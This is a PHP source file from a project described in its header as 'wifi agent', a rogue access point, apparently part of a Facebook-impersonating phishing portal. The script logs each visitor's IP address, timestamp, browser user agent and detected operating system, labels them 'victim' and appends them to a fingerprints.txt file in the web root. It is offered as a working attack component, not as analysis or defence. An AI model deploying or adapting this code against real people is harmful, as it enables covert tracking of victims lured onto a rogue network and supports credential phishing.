<?php 

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  wifi agent is a rogue access point.
*
*  wifi agent is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  wifi agent is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


// Set File write informations
$file = "{$_SERVER['DOCUMENT_ROOT']}/fingerprints.txt";


// Get Full date of victim visit
$full_date = date("d-m-Y h:i:s");


// Get Victim IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


// Get Victim Browser
$browser = $_SERVER['HTTP_USER_AGENT'];


// Get Victim Os System

function get_operating_system() {
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $operating_system = 'Unknown Operating System';

    //Get the operating_system name
    if (preg_match('/linux/i', $u_agent)) {
        $operating_system = 'Linux';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
        $operating_system = 'Mac';
    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
        $operating_system = 'Windows';
    } elseif (preg_match('/ubuntu/i', $u_agent)) {
        $operating_system = 'Ubuntu';
    } elseif (preg_match('/iphone/i', $u_agent)) {
        $operating_system = 'IPhone';
    } elseif (preg_match('/ipod/i', $u_agent)) {
        $operating_system = 'IPod';
    } elseif (preg_match('/ipad/i', $u_agent)) {
        $operating_system = 'IPad';
    } elseif (preg_match('/android/i', $u_agent)) {
        $operating_system = 'Android';
    } elseif (preg_match('/blackberry/i', $u_agent)) {
        $operating_system = 'Blackberry';
    } elseif (preg_match('/webos/i', $u_agent)) {
        $operating_system = 'Mobile';
    }
    
    return $operating_system;
}


$os_system = get_operating_system();





file_put_contents($file, print_r("\nFACEBOOK VICTIM FINGERPRINTS => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("IP: $ip \n", true), FILE_APPEND);
file_put_contents($file, print_r("Full-Date: $full_date \n", true), FILE_APPEND);
file_put_contents($file, print_r("User-Agent: $browser \n", true), FILE_APPEND);
file_put_contents($file, print_r("OS-System: $os_system \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>
